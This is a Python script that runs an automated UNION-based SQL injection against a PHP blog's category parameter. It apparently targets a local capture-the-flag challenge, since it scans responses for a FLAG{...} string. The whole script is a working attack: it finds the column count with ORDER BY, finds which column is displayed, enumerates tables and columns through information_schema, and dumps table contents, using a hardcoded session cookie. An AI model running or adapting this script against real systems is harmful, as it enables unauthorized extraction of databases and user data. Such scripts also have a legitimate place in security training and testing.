import requests
import urllib.parse
import time
import re

target = "http://127.0.0.1:32780/"
session_cookie = "PHPSESSID=a619c2d322b0d2025997d9751eb6d09a"
headers = {"Cookie": session_cookie}

print("="*80)
print("TARGETED DATABASE EXTRACTION USING SQL INJECTION")
print("="*80)

# Track what we find
found_tables = []
found_columns = {}
extracted_data = []

# First, get baseline
baseline = requests.get(f"{target}?category=Gifts", headers=headers, timeout=10)
baseline_size = len(baseline.text)
print(f"\n[+] Baseline response size: {baseline_size} bytes")

def send_payload(payload, description, check_flag=True):
    print(f"\n[+] {description}")
    url_encoded = urllib.parse.quote(payload, safe='')
    url = f"{target}?category={url_encoded}"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        size = len(response.text)
        
        # Check for flag first
        if check_flag:
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"\n{'='*80}")
                print(f"*** FLAG FOUND: {flag_match.group()} ***")
                print(f"{'='*80}\n")
                return {'flag': flag_match.group()}
        
        # Log size difference (important for blind injection)
        size_diff = size - baseline_size
        if abs(size_diff) > 0:
            print(f"  Size: {size} bytes (difference: {size_diff:+d})")
        
        # Extract real data (not HTML noise)
        potential_data = re.findall(r'>([^<]{10,200})<', response.text)
        real_results = []
        for item in potential_data:
            item_clean = item.strip()
            # Skip PHP notices, HTML elements, common noise
            noise_terms = ['notice', 'undefined', 'variable', 'on line', '<!doc', 'blog home', 'welcome to', 'choose a', 'all categories']
            if (len(item_clean) > 5 and 
                not any(noise in item_clean.lower() for noise in noise_terms) and
                'html' not in item_clean.lower() and
                'function' not in item_clean.lower()):
                real_results.append(item_clean)
        
        if real_results:
            unique_results = list(set(real_results))
            print(f"  [DATA] {unique_results[:8]}")
            return {'data': unique_results, 'size': size, 'text': response.text}
        
        return {'size': size, 'text': response.text}
    except Exception as e:
        print(f"  [ERROR] {e}")
        return {'error': str(e)}

# Test 1: ORDER BY to find column count
print("\n" + "="*80)
print("STEP 1: Finding column count using ORDER BY")
print("="*80)

for i in range(1, 11):
    payload = f"' ORDER BY {i}--"
    result = send_payload(payload, f"ORDER BY column {i}", check_flag=False)
    if result.get('size', baseline_size) < baseline_size - 10:
        column_count = i - 1
        print(f"  [!] Order by {i} failed, column count likely: {column_count}")
        break
else:
    column_count = 5  # Default assumption
    print(f"  [!] Could not determine, assuming: {column_count}")

# Test 2: UNION with NULLs
print("\n" + "="*80)
print("STEP 2: UNION injection with NULL values")
print("="*80)

nulls = ','.join(['NULL'] * column_count)
payload = f"' UNION SELECT {nulls}--"
send_payload(payload, "UNION with all NULL")

# Test 3: Try version() in different positions to see where data appears
print("\n" + "="*80)
print("STEP 3: Find which column displays data")
print("="*80)

for pos in range(1, column_count + 1):
    cols = []
    for i in range(1, column_count + 1):
        cols.append('@@version' if i == pos else 'NULL')
    
    payload = f"' UNION SELECT {','.join(cols)}--"
    result = send_payload(payload, f"Version() in position {pos}")
    if result.get('data'):
        print(f"  [!] DATA APPEARS IN POSITION {pos}")
        display_pos = pos
        break
else:
    display_pos = 1
    print(f"  [!] Assuming data appears in position 1")

# Test 4: Extract table names
print("\n" + "="*80)
print("STEP 4: Extract table names")
print("="*80)

for offset in range(0, 10):
    cols = []
    for i in range(1, column_count + 1):
        if i == display_pos:
            cols.append(f"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {offset})")
        else:
            cols.append('NULL')
    
    payload = f"' UNION SELECT {','.join(cols)}--"
    result = send_payload(payload, f"Table name {offset+1}")
    
    if result.get('data'):
        found_tables.extend(result['data'])
        print(f"  [FOUND] {result['data']}")
    
    if offset > 0 and not result.get('data'):
        break

# Remove duplicates
found_tables = list(set([t.lower() for t in found_tables if t and t != '']))
if found_tables:
    print(f"\n  [SUMMARY] Found tables: {found_tables}")

# Test 5: Try to directly extract from common table names
print("\n" + "="*80)
print("STEP 5: Direct extraction from common tables")
print("="*80)

common_tables = ['flag', 'users', 'admin', 'posts', 'articles', 'blog', 'categories']
if found_tables:
    common_tables = found_tables + common_tables

for table in common_tables[:8]:  # Test first 8
    # Try to get column count
    cols = []
    for i in range(1, column_count + 1):
        if i == display_pos:
            cols.append(f"(SELECT COUNT(*) FROM {table})")
        else:
            cols.append('NULL')
    
    payload = f"' UNION SELECT {','.join(cols)}--"
    result = send_payload(payload, f"Count rows in {table}")
    
    # Try to extract first column value
    for col_pos in range(1, column_count + 1):
        cols = []
        for i in range(1, column_count + 1):
            if i == display_pos:
                cols.append(f"(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT 1 OFFSET {col_pos-1})")
            else:
                cols.append('NULL')
        
        payload = f"' UNION SELECT {','.join(cols)}--"
        result = send_payload(payload, f"Column {col_pos} of {table}", check_flag=True)
        if 'flag' in result:
            exit()
        if result.get('data'):
            break
    
    time.sleep(0.2)

# Test 6: Try GROUP_CONCAT to get all data at once
print("\n" + "="*80)
print("STEP 6: GROUP_CONCAT extraction")
print("="*80)

for table in common_tables[:6]:
    print(f"\n  [TRYING] Table: {table}")
    
    # Try to extract everything
    cols = []
    for i in range(1, column_count + 1):
        if i == display_pos:
            cols.append(f"(SELECT GROUP_CONCAT(*) FROM {table} LIMIT 1)")
        else:
            cols.append('NULL')
    
    payload = f"' UNION SELECT {','.join(cols)}--"
    result = send_payload(payload, f"GROUP_CONCAT from {table}", check_flag=True)
    
    if 'flag' in result:
        exit()
    if result.get('data'):
        print(f"  [GOT DATA] {result['data']}")

# Test 7: Try direct flag extraction
print("\n" + "="*80)
print("STEP 7: Direct flag extraction")
print("="*80)

flag_attempts = [
    f"' UNION SELECT flag,{nulls.split(',', 1)[1]} FROM flag--",
    f"' UNION SELECT flag,{nulls.split(',', 1)[1]} FROM flags--",
    f"' UNION SELECT flag,{nulls.split(',', 1)[1]} FROM secret--",
    f"' UNION SELECT flag,{nulls.split(',', 1)[1]} FROM secrets--",
    f"' UNION SELECT flag,{nulls.split(',', 1)[1]} FROM challenges--",
    f"' UNION SELECT data,{nulls.split(',', 1)[1]} FROM flag--",
    f"' UNION SELECT value,{nulls.split(',', 1)[1]} FROM flag--",
]

for i, payload in enumerate(flag_attempts):
    result = send_payload(payload, f"Flag attempt {i+1}", check_flag=True)
    if 'flag' in result:
        exit()
    time.sleep(0.1)

print("\n" + "="*80)
print("EXTRACTION ATTEMPTS COMPLETE")
print("="*80)
print("Check results above for any discovered tables or extracted flags.")
